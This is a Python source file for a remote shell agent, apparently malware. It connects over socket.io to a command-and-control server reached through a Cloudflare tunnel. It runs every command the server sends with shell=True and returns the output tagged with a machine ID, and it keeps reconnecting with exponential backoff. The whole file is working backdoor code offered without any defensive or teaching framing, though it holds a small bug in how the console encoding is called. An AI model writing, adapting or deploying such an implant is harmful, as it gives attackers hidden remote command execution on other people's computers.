import subprocess 
import threading
import socketio
import time
from config import C2_HOST, C2_PORT, MACHINE_ID
C2_URL = C2_HOST  # port handled by Cloudflare tunnel, no need to append

# get the console encoding
def get_console_encoding():
    """Read the active OEM codepage from the system registry."""
    result = subprocess.run("chcp", shell=True, capture_output=True, text=True, encoding="ascii")
    # output is like "Active code page: 862"
    try:
        return "cp" + result.stdout.strip().split(": ")[1]
    except:
        return "cp850"  # safe fallback

CONSOLE_ENCODING = get_console_encoding()

def make_client():
    """Create a fresh socketio client with event handlers registered."""
    sio = socketio.Client()

    @sio.on("connect")
    def on_connect():
        print("[+] Shell agent connected to C2")

    @sio.on("shell_command")
    def on_command(data):
        """Receive command from C2, run it, send output back."""
        command = data.get("command", "")
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=10,
                encoding=CONSOLE_ENCODING(),
                errors="replace"
            )
            output = result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            output = "[timeout]"
        except Exception as e:
            output = f"[error] {e}"

        sio.emit("shell_output", {
            "machine": MACHINE_ID,
            "output": output
        })

    return sio


def start():
    """Connect to C2 with exponential backoff retry on failure."""
    delay = 2       # starting wait time in seconds
    max_delay = 60  # cap — never wait longer than this

    while True:
        sio = make_client()
        try:
            sio.connect(C2_URL)
            sio.wait()          # blocks until disconnected
        except Exception:
            pass                # connection failed or dropped — fall through to retry
        finally:
            try:
                sio.disconnect()
            except Exception:
                pass

        # If we get here, connection was lost or never made — retry
        print(f"[!] Disconnected. Retrying in {delay}s...")
        time.sleep(delay)
        delay = min(delay * 2, max_delay)  # double it, but cap at max_delay


if __name__ == "__main__":
    start()